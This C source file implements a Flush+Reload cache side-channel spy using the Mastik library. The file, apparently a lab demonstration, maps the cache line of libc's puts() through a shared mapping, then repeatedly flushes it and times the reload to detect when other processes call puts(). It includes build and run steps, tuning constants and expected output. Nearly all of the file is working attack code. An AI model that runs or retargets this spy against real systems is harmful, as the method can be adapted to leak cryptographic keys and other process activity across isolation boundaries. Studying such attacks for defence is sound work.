/*
 * attack1_flush_reload.c  —  Flush+Reload side-channel attack
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * WHAT IT DOES:
 *   Spies on any process that calls puts() from the shared libc.
 *   Every time a victim process calls puts(), this spy detects it.
 *
 * HOW FLUSH+RELOAD WORKS:
 *   1. Spy maps the same PHYSICAL cache line as puts() via MAP_SHARED.
 *   2. Spy flushes that line with CLFLUSH — now it's in DRAM, not cache.
 *   3. Spy waits one time slot (~1ms).
 *   4. Spy reloads the line and measures time:
 *        < THRESHOLD cycles → CACHE HIT  → victim called puts() in this slot
 *        > THRESHOLD cycles → CACHE MISS → victim did not call puts()
 *
 * BUILD:
 *   gcc -O0 -o attack1_flush_reload attack1_flush_reload.c \
 *       -I$HOME/Mastik -L$HOME/Mastik/src -lmastik
 *
 * RUN (two terminals):
 *   Terminal 1:  LD_LIBRARY_PATH=$HOME/Mastik/src ./attack1_flush_reload
 *   Terminal 2:  echo "hello"    ← any program calling puts()
 *
 * EXPECTED OUTPUT:
 *   [SLOT  4216] HIT! puts() called!  (reload = 96 cycles)
 *   [SLOT  6310] HIT! puts() called!  (reload = 104 cycles)
 *   ...
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <mastik/low.h>
#include "mastik_shared.h"

/* ── Configuration — adjust if your libc differs ────────────────────────── */
#define LIBC_PATH     "/lib/x86_64-linux-gnu/libc.so.6"
#define PUTS_OFFSET    0x87be0    /* from: readelf -s libc.so.6 | grep " puts@@" */

#define THRESHOLD      200        /* cycles — hit<200, miss>200 on this system */
#define NUM_SLOTS      100000     /* number of probe slots to run               */
#define SLOT_CYCLES    300000     /* ~0.3ms per slot (tune for your CPU speed)  */

int main(void) {
    /* ── Step 1: Map puts() via MAP_SHARED (spy shares physical page) ───── */
    void *spy_ptr = shared_map_offset(LIBC_PATH, PUTS_OFFSET);
    if (!spy_ptr) {
        fprintf(stderr, "[!] shared_map_offset failed.\n");
        fprintf(stderr, "    Check LIBC_PATH and PUTS_OFFSET.\n");
        fprintf(stderr, "    Run: readelf -s %s | grep ' puts@@'\n", LIBC_PATH);
        return 1;
    }

    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║        ATTACK 1: Flush+Reload Spy                   ║\n");
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║ Target  : puts() in %-33s║\n", LIBC_PATH);
    printf("║ Offset  : 0x%05x                                    ║\n", PUTS_OFFSET);
    printf("║ Spy ptr : %p                           ║\n", spy_ptr);
    printf("║ Threshold: %d cycles (hit<thresh<miss)              ║\n", THRESHOLD);
    printf("║ Slots    : %d  (~%.0f seconds)               ║\n",
           NUM_SLOTS, (double)NUM_SLOTS * SLOT_CYCLES / 3e9);
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    printf("[spy] Monitoring... open another terminal and run: echo hello\n\n");

    int hits = 0;

    for (int slot = 0; slot < NUM_SLOTS; slot++) {

        /* ── Step 2: Flush the cache line ─────────────────────────────── */
        clflush(spy_ptr);
        mfence();

        /* ── Step 3: Wait — victim may run here ───────────────────────── */
        uint64_t deadline = rdtscp64() + SLOT_CYCLES;
        while (rdtscp64() < deadline) { /* busy wait */ }

        /* ── Step 4: Reload and time it ───────────────────────────────── */
        mfence();
        uint32_t t1 = rdtscp();
        volatile char x = *(char *)spy_ptr;   /* the reload */
        uint32_t elapsed = rdtscp() - t1;
        (void)x;

        /* ── Step 5: Classify ─────────────────────────────────────────── */
        if (elapsed < THRESHOLD) {
            printf("[SLOT %6d] *** HIT ***  puts() called!  (reload = %3u cycles)\n",
                   slot, elapsed);
            fflush(stdout);
            hits++;
        }
    }

    printf("\n[spy] Finished. Total detections: %d / %d slots\n", hits, NUM_SLOTS);
    return 0;
}
